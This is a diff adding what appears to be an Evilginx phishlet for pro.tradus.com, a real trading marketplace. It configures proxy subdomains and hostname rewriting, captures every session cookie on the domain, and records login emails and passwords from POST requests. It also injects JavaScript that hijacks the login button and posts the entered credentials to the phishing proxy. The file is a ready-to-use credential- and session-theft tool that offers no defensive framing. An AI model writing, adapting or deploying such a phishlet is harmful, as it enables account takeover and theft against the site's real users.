@@ -1,0 +1,65 @@
+author: '@AN0NUD4Y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'pro', orig_sub: 'pro', domain: 'tradus.com', session: true, is_landing: false}
+  - {phish_sub: 'api', orig_sub: 'api-pro', domain: 'tradus.com', session: true, is_landing: true}
+
+sub_filters:
+  - {triggers_on: 'pro.tradus.com', orig_sub: 'pro', domain: 'tradus.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'pro.tradus.com', orig_sub: 'pro', domain: 'tradus.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'pro.tradus.com', orig_sub: 'pro', domain: 'tradus.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'pro.tradus.com', orig_sub: 'api-pro', domain: 'tradus.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'pro.tradus.com', orig_sub: 'api-pro', domain: 'tradus.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'pro.tradus.com', orig_sub: 'api-pro', domain: 'tradus.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'api-pro.tradus.com', orig_sub: 'api-pro', domain: 'tradus.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'api-pro.tradus.com', orig_sub: 'api-pro', domain: 'tradus.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'api-pro.tradus.com', orig_sub: 'api-pro', domain: 'tradus.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+
+
+auth_tokens:
+  - domain: '.tradus.com'
+    keys: ['','.*,regexp']
+
+credentials:
+  username:
+    key: 'Email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'Password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'pro.tradus.com'
+  path: '/login'
+
+js_inject:
+  - trigger_domains: ["pro.tradus.com"]
+    trigger_paths: ["/login"]
+    trigger_params: []
+    script: |
+      function lp(){
+        var submit = document.querySelectorAll('button[type=button]')[4];
+        submit.setAttribute("onclick", "sendData()");
+        return;
+      }
+      function sendData(){
+        var email = document.getElementsByName("email")[1].value;
+        var password = document.getElementsByName("password")[0].value;
+        var xhr2 = new XMLHttpRequest();
+        xhr2.open("POST", '/', true);
+        xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr2.send("Email="+encodeURIComponent(email));
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("Password="+encodeURIComponent(password));
+        return;
+      }
+      setTimeout(function(){ lp(); }, 2500);
+      
+      
+      
+      
+      
